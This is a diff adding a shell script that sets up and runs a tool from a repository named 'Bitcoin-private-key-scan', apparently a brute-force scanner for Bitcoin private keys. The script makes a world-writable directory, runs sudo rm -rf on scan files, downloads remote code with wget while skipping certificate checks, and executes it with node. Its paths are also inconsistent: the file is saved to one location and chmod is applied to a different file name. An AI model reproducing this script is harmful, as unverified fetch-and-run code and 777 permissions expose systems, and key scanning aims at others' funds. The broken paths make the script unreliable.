@@ -1,0 +1,20 @@
+#!/bin/sh
+
+# create dir
+cd ~
+sudo mkdir -p ~/njs/b
+sudo chmod 777 ~/njs/b
+
+# cleanup
+cd ~
+sudo rm -rf ~/njs/b/scan.*
+
+# download
+wget --no-check-certificate -q "https://raw.githubusercontent.com/itvn9online/Bitcoin-private-key-scan/main/createServer" -O "/njs/b/createServer"
+
+# chmod
+sudo chmod +x ~/njs/b/createServer.js
+
+# run
+cd ~/njs/b
+node createServer
